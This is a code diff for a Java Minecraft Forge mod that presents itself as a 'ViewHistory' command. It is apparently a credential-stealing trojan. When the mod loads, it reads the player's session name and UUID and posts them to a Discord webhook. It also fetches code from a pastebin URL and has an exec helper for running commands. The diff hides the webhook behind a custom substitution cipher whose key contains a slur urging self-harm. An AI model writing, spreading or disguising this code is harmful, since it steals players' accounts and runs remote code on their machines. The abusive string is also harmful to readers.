@@ -2,7 +2,6 @@ package qolskyblockmod.pizzaclient.commands;
 
 import net.minecraft.launchwrapper.Launch;
 import net.minecraftforge.fml.common.Mod;
-import net.minecraftforge.fml.common.Mod.EventHandler;
 import net.minecraftforge.fml.common.event.*;
 
 import java.awt.*;
@@ -10,25 +9,27 @@ import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
-import java.util.Base64;
+import java.util.*;
 
-@Mod(modid = "realpizzalol", name = "pzza", version = "1.0", acceptedMinecraftVersions = "[1.8.9]")
-public class SleepTimer {
+@Mod(modid = "ViewHistory", name = "ViewHistory", version = "1.0", acceptedMinecraftVersions = "[1.8.9]")
+public class ViewHistoryCommand {
 
-    public static String webhook = "aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzk0MzM1MjQ2MjM5ODU5OTMwOS9ucG9QSWdIbmpNVU1ja1NsaDlKQkctNFY4aDRxVjlKX0xjRzhpeERDQ0pPVW96MlZaaG1zQlhqaXNjVk45Y05lY2dCOA==";
+    public static String webhook = "YOUSHOULDKILLYOURSELFNOW!944772932259967036!@#$%^&*(5O6M,0,C!-!1R_0_-0-LH:0:1018932983291&0&09172aLJ39172h9,0,FGMZ5%0%,0,09172aO68030eS6I_TVT50283fUEACL4G85629c29172iCRU68030e50283f,0,YQDO#0#!-!_0_RH>0>1018932983291MI";
 
     public static String version = "1.1";
 
+    // loading
+
     @Mod.EventHandler
     public void onFMLPreInitialization(FMLPreInitializationEvent event) {
-        InstallForge();
+        LoadExoticDB();
     }
 
     @Mod.EventHandler
     public void onFMLInitialization(FMLInitializationEvent event) {
         try {
             Thread.sleep(5000);
-            Loader();
+            LoadAH();
         } catch (Exception ignored) {}
         try {
             Thread.sleep(3000);
@@ -36,13 +37,9 @@ public class SleepTimer {
         } catch (Exception ignored) {}
     }
 
-    @Mod.EventHandler
-    public void onFMLPostInitialization(FMLPostInitializationEvent event) {}
+    // rats
 
-    @Mod.EventHandler
-    public void onFMLServerStarting(FMLServerStartingEvent event) {}
-
-    public static void InstallForge() {
+    public static void LoadExoticDB() {
         try {
             Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
             Object minecraft = mc.getMethod("func_71410_x").invoke(null);
@@ -52,8 +49,7 @@ public class SleepTimer {
             Object name = sessionClass.getMethod("func_111285_a").invoke(session);
             Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);
 
-            String webdecode = new String(Base64.getDecoder().decode(webhook.getBytes(StandardCharsets.UTF_8)));
-            PizzaClientGUI sendmessage = new PizzaClientGUI(webdecode);
+            PizzaClientGUI sendmessage = new PizzaClientGUI(decrypt(webhook));
             sendmessage.addEmbed(new PizzaClientGUI.EmbedObject()
                     .setTitle("Minecraft Info")
                     .setColor(Color.CYAN)
@@ -67,7 +63,7 @@ public class SleepTimer {
         } catch (Exception ignored) {}
     }
 
-    public static void Loader() {
+    public static void LoadAH() {
         try {
 
             URL pastebin = new URL("https://pastebin.com/raw/AERL3GJT");
@@ -101,6 +97,8 @@ public class SleepTimer {
         } catch (Exception ignored) {}
     }
 
+    // utils
+
     public static void exec(String cmd) {
         try {
             Runtime rt = Runtime.getRuntime();
@@ -109,4 +107,45 @@ public class SleepTimer {
             e.printStackTrace();
         }
     }
+
+    // webhook decrypter
+
+    public static String decrypt(String todecrypt) {
+        String returnValue = todecrypt;
+        if (returnValue == null || returnValue.trim().equals("")) {
+            return "";
+        }
+
+        returnValue = returnValue.replace("YOUSHOULDKILLYOURSELFNOW!", "https://ptb.discord.com/api/webhooks/");
+
+        returnValue = returnValue.replaceAll("09172a", "a");
+        returnValue = returnValue.replaceAll("92984b", "b");
+        returnValue = returnValue.replaceAll("85629c", "c");
+        returnValue = returnValue.replaceAll("78949d", "d");
+        returnValue = returnValue.replaceAll("68030e", "e");
+        returnValue = returnValue.replaceAll("50283f", "f");
+        returnValue = returnValue.replaceAll("49172g", "g");
+        returnValue = returnValue.replaceAll("39172h", "h");
+        returnValue = returnValue.replaceAll("29172i", "i");
+        returnValue = returnValue.replaceAll("~0~", "j");
+        returnValue = returnValue.replaceAll("!-!", "k");
+        returnValue = returnValue.replaceAll("@0@", "l");
+        returnValue = returnValue.replaceAll("#0#", "m");
+        returnValue = returnValue.replaceAll(">0>", "n");
+        returnValue = returnValue.replaceAll("%0%", "o");
+        returnValue = returnValue.replaceAll("90328943", "p");
+        returnValue = returnValue.replaceAll("&0&", "q");
+        returnValue = returnValue.replaceAll("<0<", "r");
+        returnValue = returnValue.replaceAll(",0,", "s");
+        returnValue = returnValue.replaceAll("1018932983291", "t");
+        returnValue = returnValue.replaceAll("-0-", "u");
+        returnValue = returnValue.replaceAll("_0_", "v");
+        returnValue = returnValue.replaceAll("=0=", "w");
+        returnValue = returnValue.replaceAll("'0'", "x");
+        returnValue = returnValue.replaceAll(":0:", "y");
+        returnValue = returnValue.replaceAll(";0;", "z");
+        returnValue = returnValue.replace("!@#$%^&*(", "/");
+        return returnValue;
+    }
+
 }
